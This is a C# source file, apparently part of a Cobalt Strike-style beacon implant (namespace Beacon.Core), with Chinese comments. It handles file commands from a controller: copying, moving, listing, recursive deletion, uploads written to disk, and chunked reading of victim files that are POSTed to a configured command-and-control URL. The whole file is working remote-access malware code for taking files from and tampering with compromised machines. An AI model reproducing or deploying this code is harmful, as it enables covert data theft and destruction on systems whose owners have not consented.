using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using Beacon.Profiles;
using Beacon.Utils;

namespace Beacon.Core
{
    /// <summary>
    /// 文件操作相关
    /// </summary>
    class Files
    {
        public static byte[] _requestId = null;

        /// <summary>
        /// 复制文件
        /// </summary>
        public static byte[] CopyFile(byte[] pFiles)
        {
            byte[] pSrcLen = new byte[4];
            Array.Copy(pFiles, 0, pSrcLen, 0, 4);                                       //源文件名长度
            Array.Reverse(pSrcLen);
            int nSrcLen = BitConverter.ToInt32(pSrcLen, 0);
            byte[] pSrc = new byte[nSrcLen];
            Array.Copy(pFiles, 4, pSrc, 0, nSrcLen);                                    //源文件名

            byte[] pDstLen = new byte[4];
            Array.Copy(pFiles, 4 + nSrcLen, pDstLen, 0, 4);                             //目标文件长度
            Array.Reverse(pDstLen);
            int nDstLen = BitConverter.ToInt32(pDstLen, 0);
            byte[] pDst = new byte[nDstLen];
            Array.Copy(pFiles, 4 + nSrcLen +4, pDst, 0, nDstLen);                       //目标文件名

            FileInfo file = new FileInfo(Bytes.ToString(pSrc));
            if (file.Exists)
            {
                file.CopyTo(Bytes.ToString(pDst), true);
                return Bytes.FromString("ok");
            }
            else 
            {
                return Bytes.FromString("源文件不存在");
            }
        }

        /// <summary>
        /// 移动文件
        /// </summary>
        public static byte[] MoveFile(byte[] pFiles)
        {
            byte[] pSrcLen = new byte[4];
            Array.Copy(pFiles, 0, pSrcLen, 0, 4);                                       //源文件名长度
            Array.Reverse(pSrcLen);
            int nSrcLen = BitConverter.ToInt32(pSrcLen, 0);
            byte[] pSrc = new byte[nSrcLen];
            Array.Copy(pFiles, 4, pSrc, 0, nSrcLen);                                    //源文件名

            byte[] pDstLen = new byte[4];
            Array.Copy(pFiles, 4 + nSrcLen, pDstLen, 0, 4);                             //目标文件长度
            Array.Reverse(pDstLen);
            int nDstLen = BitConverter.ToInt32(pDstLen, 0);
            byte[] pDst = new byte[nDstLen];
            Array.Copy(pFiles, 4 + nSrcLen + 4, pDst, 0, nDstLen);                       //目标文件名

            FileInfo file = new FileInfo(Bytes.ToString(pSrc));
            if (file.Exists)
            {
                file.MoveTo(Bytes.ToString(pDst));
                return Bytes.FromString("ok");
            }
            else 
            {
                return Bytes.FromString("源文件不存在");
            }
        }

        /// <summary>
        /// 获得相应文件大小
        /// </summary>
        public static byte[] GetFileLen(byte[] pFiles)
        {
            try
            {
                using (FileStream m_FileStream = new FileStream(Bytes.ToString(pFiles), FileMode.Open)) 
                {
                    Random rnd = new Random();
                    int n = rnd.Next(100000, 999998);
                    _requestId = BitConverter.GetBytes(n);
                    int nFileLen = (int)m_FileStream.Length;
                    byte[] pFileLen = BitConverter.GetBytes(nFileLen);
                    Array.Reverse(pFileLen);
                    return Bytes.Combine(_requestId, pFileLen, pFiles);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("There is an IOException");
                Console.WriteLine(ex.Message);
            }
            return null;
        }

        /// <summary>
        /// 下载文件
        /// </summary>
        public static void DownloadFile(byte[] pFiles, Func<string, byte[], byte[]> FuncPost, Func<int, byte[], byte[]> FuncMakeData)
        {
            using (FileStream fsRead = new FileStream(Bytes.ToString(pFiles), FileMode.Open)) 
            {
                byte[] byteArrayRead = new byte[512 * 1024];                                                    //512kb 开辟临时缓存内存

                while (true)
                {
                    Array.Clear(byteArrayRead, 0, byteArrayRead.Length);
                    
                    int readCount = fsRead.Read(byteArrayRead, 0, byteArrayRead.Length);                        //readCount 读取到的字节数

                    if (readCount < byteArrayRead.Length)
                    {
                        byte[] pFileDataLast = new byte[readCount];
                        Array.Copy(byteArrayRead, 0, pFileDataLast, 0, readCount);

                        byte[] pFileData = FuncMakeData(8, Bytes.Combine(_requestId, pFileDataLast));
                        FuncPost(Config._POSTURL + Config._nBeaconID, pFileData);
                        break;                                                                                  //结束循环

                    }
                    else 
                    {
                        //fsWrite.Write(byteArrayRead, 0, readCount);
                        byte[] pFileData = FuncMakeData(8, Bytes.Combine(_requestId, byteArrayRead));
                        FuncPost(Config._POSTURL + Config._nBeaconID, pFileData);
                    }

                }

            }
            byte[] pFinal = FuncMakeData(9, _requestId);
            FuncPost(Config._POSTURL + Config._nBeaconID, pFinal);
        }

        /// <summary>
        /// 上传文件
        /// </summary>
        public static void UploadFile(byte[] pFiles)
        {
            //还是拿解密后的数据，得到昨天的情况，在写之前去掉相关的两行
            byte[] pFileNamrLen = new byte[4];
            Array.Copy(pFiles, 0, pFileNamrLen, 0, 4);                                       //源文件名长度
            Array.Reverse(pFileNamrLen);
            int nFileNameLen = BitConverter.ToInt32(pFileNamrLen, 0);
            byte[] pFileName = new byte[nFileNameLen];
            Array.Copy(pFiles, 4, pFileName, 0, nFileNameLen);                                    //源文件名

            int nContentLen = pFiles.Length - 4 - nFileNameLen;
            byte[] pContent = new byte[nContentLen];

            Array.Copy(pFiles, 4 + nFileNameLen, pContent, 0, nContentLen);                    //内容

            byte[] tmp = { 0x00, 0x00, 0x00, 0x10 };
            byte[] replaceContent = Bytes.Combine(tmp, pFileName);
            
            byte[] x = Bytes.ReplaceBytes(pContent, replaceContent,null);                       //删除中间添加的字符串

            using (FileStream fsWrite = new FileStream(Bytes.ToString(pFileName), FileMode.Append, FileAccess.Write))
            {
                fsWrite.Seek(0, SeekOrigin.End);
                fsWrite.Write(x, 0, x.Length);
            };
        }

        /// <summary>
        /// 遍历当前文件夹
        /// </summary>
        public static byte[] Browse(byte[] pFiles)
        {
            //先解析
            byte[] pPendingRequest = new byte[4];
            Array.Copy(pFiles, 0, pPendingRequest, 0, 4);

            byte[] pDirPathLen = new byte[4];
            Array.Copy(pFiles, 4, pDirPathLen, 0, 4);
            Array.Reverse(pDirPathLen);
            int nDirPathLen = BitConverter.ToInt32(pDirPathLen, 0);

            byte[] pDirPath = new byte[nDirPathLen];
            Array.Copy(pFiles, 8, pDirPath, 0, nDirPathLen);                                    //需要遍历的目标文件夹

            string sDirPath = Bytes.ToString(pDirPath).Replace('\\', '/').Replace("*", "");
            string sRes = null;

            //再遍历
            if (Directory.Exists(sDirPath))
            {
                DirectoryInfo dir = new DirectoryInfo(sDirPath);
                //当前参数的路径
                if (sDirPath == "./")
                {
                    sRes = dir.FullName;
                }
                else
                {
                    sRes = sDirPath;
                }
                //拼接.和..
                sRes += String.Format("\nD\t\t0\t\t{0}\t\t.", dir.CreationTimeUtc);
                sRes += String.Format("\nD\t\t0\t\t{0}\t\t..", dir.CreationTimeUtc);

                FileSystemInfo[] fileinfo = dir.GetFileSystemInfos();                                    //返回目录中所有文件和子目录
                foreach (FileSystemInfo i in fileinfo)
                {
                    Console.WriteLine(i.Name);
                    if (i is DirectoryInfo)                                                              //判断是否文件夹
                    {
                        DirectoryInfo subdir = new DirectoryInfo(i.FullName);
                        sRes += String.Format("\nD\t\t0\t\t{0}\t\t{1}", subdir.CreationTimeUtc,subdir.Name);
                    }
                    else
                    {
                        FileInfo CurFileInfo = new FileInfo(i.FullName);
                        sRes += String.Format("\nF\t\t{2}\t\t{0}\t\t{1}", CurFileInfo.CreationTimeUtc, CurFileInfo.Name,CurFileInfo.Length);
                    }
                }
            }
            return Bytes.FromString(Bytes.ToString(pPendingRequest) + sRes);
        }

        /// <summary>
        /// 创建文件夹
        /// </summary>
        public static byte[] MkDir(byte[] pFiles)
        {
            if (!Directory.Exists(Bytes.ToString(pFiles)))
            {
                Directory.CreateDirectory(Bytes.ToString(pFiles));
                return Bytes.FromString("ok");
            }
            else 
            {
                return Bytes.FromString("文件夹已存在");
            }
        }


        /// <summary>
        /// 删除文件
        /// </summary>
        public static byte[] RemoveFile(byte[] pFiles)
        {
            if (Directory.Exists(Bytes.ToString(pFiles)))
            {
                //Console.WriteLine("文件夹");
                DirectoryInfo dir = new DirectoryInfo(Bytes.ToString(pFiles));
                FileSystemInfo[] fileinfo = dir.GetFileSystemInfos();                                    //返回目录中所有文件和子目录
                foreach (FileSystemInfo i in fileinfo)
                {
                    if (i is DirectoryInfo)                                                              //判断是否文件夹
                    {
                        DirectoryInfo subdir = new DirectoryInfo(i.FullName);
                        subdir.Delete(true);                                                             //删除子目录和文件
                    }
                    else
                    {
                        File.Delete(i.FullName);                                                         //删除指定文件
                    }
                }
                dir.Delete(true);
                return Bytes.FromString("ok");
            }
            else
            {
                if (File.Exists(Bytes.ToString(pFiles)))
                {
                    //Console.WriteLine("文件");
                    File.Delete(Bytes.ToString(pFiles));                                                  //删除指定文件
                    return Bytes.FromString("ok");
                }
                else
                {
                    return Bytes.FromString("无效路径");
                }
            }
        }
    }
}
